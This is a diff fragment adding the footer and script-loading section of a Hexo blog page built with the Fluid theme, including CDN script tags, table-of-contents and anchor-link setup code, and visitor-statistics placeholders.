+           <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <div id="umami-footer-stats" style="font-size: 0.85rem; display: none;"> <span>总访问量 <span id="umami-site-pv">--</span> 次</span> <span style="margin-left: 0.75rem;">总访客数 <span id="umami-site-uv">--</span> 人</span> </div> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/openkounter.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/umami-footer-stats.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
